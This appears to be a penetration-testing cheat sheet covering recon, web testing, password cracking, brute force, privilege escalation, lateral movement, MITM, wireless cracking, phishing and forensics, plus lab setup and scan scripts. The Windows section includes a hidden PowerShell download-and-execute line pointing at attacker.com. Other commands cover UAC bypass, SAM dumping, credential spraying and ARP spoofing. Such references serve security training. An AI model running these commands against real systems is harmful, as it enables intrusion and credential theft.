# 🛠️ CYBERSECURITY TOOLS REFERENCE & QUICK START GUIDE

---

## 📚 COMPREHENSIVE TOOLS INDEX

### RECONNAISSANCE & OSINT TOOLS

#### Network Scanning
```bash
# Nmap - Network mapper
nmap -sV -sC -A target.com
nmap -p- target.com  # All ports
nmap -sU target.com  # UDP scan
nmap --script vuln target.com  # Vulnerability scripts

# Masscan - Fast scanner
masscan -p1-65535 target.com --rate=1000

# Shodan - Internet-wide search
shodan search "apache 2.4"
shodan host IP_ADDRESS

# Censys
censys.io  # Online search
```

#### Passive Reconnaissance
```bash
# WHOIS & DNS
whois domain.com
dig domain.com MX
nslookup domain.com
dnsenum domain.com

# Subdomain discovery
subfinder -d domain.com
assetfinder domain.com
amass enum -d domain.com

# Certificate search
crt.sh
certspotter
censys certificates

# Technology identification
whatweb domain.com
wappalyzer domain.com
builtwith domain.com
```

---

### WEB SECURITY TOOLS

#### Burp Suite Alternatives
```bash
# OWASP ZAP (Free)
zaproxy  # Launch GUI
zaproxy.sh -cmd -quickurl http://target.com -quickout report.html

# Fiddler (Windows)
# Web debugging proxy

# Mitmproxy (Open source)
mitmproxy
mitmweb  # Web interface
```

#### SQL Injection Testing
```bash
# SQLMap - Automated SQLi testing
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page" --forms --batch
sqlmap --list-tampers  # Evasion techniques

# SQLNinja (Oracle specific)
sqlninja -m takeover -t 10.0.0.1
```

#### Fuzzing & Wordlists
```bash
# Wfuzz - Web application fuzzer
wfuzz -c -z file,/wordlist.txt http://target.com/api/FUZZ

# Dirb - Directory brute force
dirb http://target.com /usr/share/dirb/wordlists/common.txt

# Gobuster - Multi-purpose brute force
gobuster dir -u http://target.com -w wordlist.txt
gobuster dns -d target.com -w wordlist.txt

# SecLists - Wordlists
# /usr/share/seclists/
```

#### Parameter Discovery
```bash
# ParamSpider
paramspider -d domain.com

# Arjun - Parameter discovery
arjun -u http://target.com/page

# Kxss - Parameter fuzzing
kxss -u "http://target.com/page?param=FUZZ"
```

---

### AUTHENTICATION & CREDENTIAL TESTING

#### Password Cracking
```bash
# John the Ripper
john --format=sha512 hashes.txt
john --wordlist=/path/wordlist.txt --rules hashes.txt

# Hashcat
hashcat -m 0 hashes.txt wordlist.txt  # MD5
hashcat -m 1000 hashes.txt wordlist.txt  # NTLM
hashcat -m 1800 hashes.txt wordlist.txt  # SHA512

# Rockyou wordlist
/usr/share/wordlists/rockyou.txt
```

#### Brute Force & Password Spraying
```bash
# Hydra - Multi-purpose brute force
hydra -l admin -P wordlist.txt ssh://target.com
hydra -L users.txt -P wordlist.txt http-get http://target.com/admin/

# Medusa
medusa -h target.com -u admin -P wordlist.txt -M ssh

# Crackmapexec - Network authentication
crackmapexec smb 192.168.1.0/24 -u admin -p password
crackmapexec smb 192.168.1.100 -u admin -p password --sam

# FF-Pass (Office 365 spray)
python3 ff-pass.py -u users.txt -p password -t 10
```

#### JWT Exploitation
```bash
# JWT.io - Online decoder
jwt.io

# JWTtool
jwtool -t "eyJhbGciOi..." -M verify -s "secret"
jwtool -t "eyJhbGciOi..." -M none  # Algorithm confusion

# JQ - JSON processing
echo $JWT | cut -d. -f2 | base64 -d | jq .
```

---

### NETWORK & PROTOCOL ANALYSIS

#### Packet Capture & Analysis
```bash
# Tcpdump - Packet capture
tcpdump -i eth0 -w capture.pcap port 80
tcpdump -r capture.pcap | grep "HTTP"

# Wireshark - GUI packet analyzer
wireshark
# Apply filters: http, dns, tcp.port==443, ip.src==192.168.1.1
```

#### Protocol-Specific
```bash
# SSH
ssh-keyscan target.com
ssh-audit target.com

# DNS
dnsenum domain.com
dnsrecon -d domain.com
dig -x IP_ADDRESS  # Reverse DNS

# TLS/SSL
testssl.sh https://target.com
sslscan target.com:443
```

---

### REVERSE ENGINEERING & BINARY ANALYSIS

#### Disassemblers & Decompilers
```bash
# Ghidra - NSA reverse engineering tool
ghidra binary

# IDA Pro / IDA Free
ida binary
idaq binary  # GUI

# Radare2 - Unix-like RE framework
radare2 binary
r2 binary
# Commands: aa, afl, pdf, px, s, g

# Hopper - macOS/Linux decompiler
hopper binary
```

#### Debuggers
```bash
# GDB - GNU Debugger
gdb ./binary
(gdb) break main
(gdb) run
(gdb) step
(gdb) nexti
(gdb) print $rax

# LLDB - Apple debugger
lldb ./binary
(lldb) b main
(lldb) run

# WinDbg - Windows debugger
# Microsoft debugging tool
```

#### Binary Analysis Frameworks
```bash
# Angr - Binary analysis engine
python3 angr.py

# Unicorn - CPU emulation
python3 unicorn_emulator.py

# Capstone - Disassembly library
python3 capstone_disasm.py
```

---

### MALWARE ANALYSIS

#### Static Analysis
```bash
# Strings extraction
strings binary
strings -a binary | grep -i key

# File analysis
file binary
binwalk binary

# Entropy check
entropy binary
```

#### Dynamic Analysis
```bash
# Cuckoo Sandbox
# Cloud submission: cuckoo submit sample.exe

# Any.run
# https://any.run/

# Hybrid-Analysis
# https://www.hybrid-analysis.com/

# VirusTotal
# https://www.virustotal.com/
```

#### Malware Repositories
```bash
# VXVault
vxvault.net

# APKpure
apkpure.com

# Malshare
malshare.com
```

---

### PRIVILEGE ESCALATION

#### Linux Enumeration & Exploitation
```bash
# LinEnum - Enumeration script
bash LinEnum.sh

# Privilege Escalation Enumeration
sudo -l  # What can I run with sudo?
find / -perm -u=s -type f 2>/dev/null  # SUID binaries
find / -perm -g=s -type f 2>/dev/null  # SGID binaries
cat /etc/crontab  # Cron jobs

# Exploit kernel vulnerabilities
# CVE database search
searchsploit privilege escalation

# Dirty Cow exploit
# CVE-2016-5195
```

#### Windows Enumeration & Exploitation
```bash
# PowerUp - Privilege escalation
powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerUp.ps1')"

# Windows Exploit Suggester
python windows-exploit-suggester.py -u

# Metasploit privilege escalation
use exploit/windows/local/bypassuac_eventvwr
set LHOST attacker_ip
exploit

# Token impersonation
incognito list_tokens -u
incognito impersonate_token "NT AUTHORITY\SYSTEM"
```

---

### PERSISTENCE & LATERAL MOVEMENT

#### Post-Exploitation Frameworks
```bash
# Empire - PowerShell post-exploitation
./empire

# Covenant - C# post-exploitation
# GUI-based command and control

# Merlin - Golang agent
# Lightweight C2 framework
```

#### Lateral Movement
```bash
# PsExec - Remote command execution
psexec \\target.com -u admin -p password cmd.exe

# WMI lateral movement
wmic /node:192.168.1.100 /user:domain\admin /password:pass process call create "cmd.exe /c whoami > C:\output.txt"

# SSH key propagation
for host in $(cat hosts.txt); do
  ssh-copy-id -i ~/.ssh/id_rsa.pub user@$host
done
```

---

### NETWORK EXPLOITATION

#### Man-in-the-Middle (MITM)
```bash
# Bettercap - Network manipulation
sudo bettercap -iface eth0

# Mitmproxy - HTTP/HTTPS proxy
mitmproxy
mitmweb  # Web interface

# ARP Spoofing
arpspoof -i eth0 -t target_ip gateway_ip

# DNS Spoofing
dnsmasq -C /path/dnsmasq.conf
```

#### Wireless Hacking
```bash
# Aircrack-ng - WiFi security
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
sudo aircrack-ng -w wordlist.txt capture.cap

# Hashcat WiFi cracking
hashcat -m 2500 handshake.hccapx wordlist.txt
```

---

### SOCIAL ENGINEERING & PHISHING

#### Phishing Tools
```bash
# SET - Social Engineering Toolkit
setoolkit

# Phishing Frenzy
# Phishing campaign framework

# Gophish
# Phishing server
gophish
```

#### Email Security
```bash
# Swaks - SMTP testing
swaks --to victim@example.com --body "test" --from attacker@example.com

# Mail spoofing test
# Check SPF, DKIM, DMARC
dmarcian.com
mxtoolbox.com
```

---

### FORENSICS & INCIDENT RESPONSE

#### File Recovery & Analysis
```bash
# Foremost - File carving
foremost -i image.img -o output/

# Scalpel - Carving tool
scalpel -c /etc/scalpel/scalpel.conf image.img

# Autopsy - Digital forensics GUI
autopsy
# or via CLI

# PhotoRec - File recovery
photorec
```

#### Memory Forensics
```bash
# Volatility - Memory analysis
volatility -f memory.dump imageinfo
volatility -f memory.dump pslist
volatility -f memory.dump netscan
volatility -f memory.dump malfind

# DumpIt - Memory dump
DumpIt.exe  # Windows
```

#### Disk Forensics
```bash
# FTK Imager - Evidence acquisition
ftkimager

# Sleuth Kit
fls -r image.img
icat image.img inode_number

# Autopsy
autopsy --start-server
```

---

### COMPLIANCE & VULNERABILITY SCANNING

#### Vulnerability Scanners
```bash
# Nessus
# GUI: /opt/nessus/sbin/nessusctl start
# Web: https://localhost:8834

# OpenVAS
# Scanner: openvas-scanner
# Manager: openvas-manager

# Qualys QWEB
# Cloud-based scanning

# Rapid7 InsightVM
# Enterprise vulnerability management
```

#### Configuration Compliance
```bash
# Lynis - Auditing tool
lynis audit system

# Aide - File integrity
aide --init
aide --check

# CIS Benchmarks
# hardening scripts available
```

---

## 🚀 QUICK START SETUP SCRIPTS

### Linux Security Testing Lab Setup
```bash
#!/bin/bash
# Setup complete security testing environment

echo "[+] Installing security tools..."

# Update system
sudo apt-get update && sudo apt-get upgrade -y

# Install essential tools
sudo apt-get install -y \
  nmap \
  nikto \
  sqlmap \
  hydra \
  john \
  hashcat \
  metasploit-framework \
  burpsuite \
  wireshark \
  tcpdump \
  gobuster \
  git \
  python3-pip

# Install Python tools
pip3 install \
  requests \
  paramiko \
  pycryptodome \
  sqlalchemy \
  scapy \
  exploitdb

# Download wordlists
sudo apt-get install -y seclists

echo "[+] Setup complete!"
```

---

### Docker Security Lab
```dockerfile
FROM kalilinux/kali-rolling

RUN apt-get update && apt-get install -y \
    nmap \
    sqlmap \
    burpsuite \
    metasploit-framework \
    wireshark-cli \
    aircrack-ng \
    john \
    hashcat \
    python3-pip \
    git

RUN pip3 install \
    requests \
    scapy \
    pycryptodome \
    shodan \
    paramiko

WORKDIR /workspace
VOLUME /workspace

CMD ["/bin/bash"]
```

Run:
```bash
docker build -t security-lab .
docker run -it -v /data:/workspace security-lab bash
```

---

### All-in-One Bash Toolkit
```bash
#!/bin/bash
# Comprehensive security testing toolkit

# Color output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Target setup
TARGET=${1:-}
if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target>"
    exit 1
fi

# 1. RECONNAISSANCE
echo -e "${GREEN}[1] RECONNAISSANCE${NC}"
echo "Running Nmap scan..."
nmap -sV -sC $TARGET -o nmap_results.txt

echo "Gathering subdomains..."
subfinder -d $TARGET -o subdomains.txt

echo "Checking SSL/TLS..."
testssl.sh https://$TARGET

# 2. WEB SCANNING
echo -e "${GREEN}[2] WEB VULNERABILITY SCANNING${NC}"
echo "Running Nikto..."
nikto -h $TARGET -o nikto_results.html

echo "Running SQLMap..."
sqlmap -u "http://$TARGET/page?id=1" --batch

# 3. BRUTE FORCE
echo -e "${GREEN}[3] CREDENTIAL TESTING${NC}"
echo "Testing default credentials..."
hydra -L users.txt -P passwords.txt ssh://$TARGET

# 4. REPORT GENERATION
echo -e "${GREEN}[4] GENERATING REPORT${NC}"
cat > report_$TARGET.md << EOF
# Security Assessment Report - $TARGET

## Reconnaissance
- Nmap results: see nmap_results.txt
- Subdomains found: $(wc -l < subdomains.txt)

## Vulnerabilities Found
- See nikto_results.html

## Recommendations
- Patch all identified vulnerabilities
- Implement WAF
- Enable SSL/TLS
- Update credentials

Generated: $(date)
EOF

echo -e "${GREEN}[+] Assessment complete!${NC}"
```

---

## 🎯 REAL-WORLD TESTING SCENARIOS

### Scenario 1: Web Application Penetration Test
```bash
#!/bin/bash
# Automated web app testing

TARGET=$1

# 1. Reconnaissance
echo "[*] Phase 1: Reconnaissance"
nmap -sV -sC $TARGET

# 2. Scanning
echo "[*] Phase 2: Scanning"
nikto -h $TARGET
dirb http://$TARGET /usr/share/dirb/wordlists/common.txt

# 3. Testing
echo "[*] Phase 3: Vulnerability Testing"
sqlmap -u "http://$TARGET/" --forms --batch
wfuzz -c -z file,wordlist.txt http://$TARGET/api/FUZZ

# 4. Exploitation (if authorized)
echo "[*] Phase 4: Exploitation"
# Use Burp Suite for manual testing

# 5. Reporting
echo "[*] Generating report..."
```

### Scenario 2: Network Penetration Test
```bash
#!/bin/bash
# Network security assessment

NETWORK=$1

# Network discovery
nmap -sn $NETWORK -oG hosts.txt

# Detailed scan
nmap -sV -sC -p- $NETWORK

# Vulnerability scan
nessus scan $NETWORK

# Lateral movement testing
for host in $(grep "Up" hosts.txt | cut -d' ' -f2); do
    crackmapexec smb $host -u admin -p password
done
```

---

## 📊 TOOL COMPARISON TABLE

| Tool | Purpose | Cost | Skill Level |
|------|---------|------|-------------|
| Nmap | Network scanning | Free | Beginner |
| Metasploit | Exploitation | Free | Intermediate |
| Burp Suite | Web testing | Paid/Free | Intermediate |
| Wireshark | Packet analysis | Free | Intermediate |
| Ghidra | Reverse engineering | Free | Advanced |
| Volatility | Memory analysis | Free | Advanced |
| Shodan | OSINT | Free/Paid | Beginner |
| Splunk | Log analysis | Paid | Intermediate |

---

**Last Updated**: June 2024
**Version**: 2.0
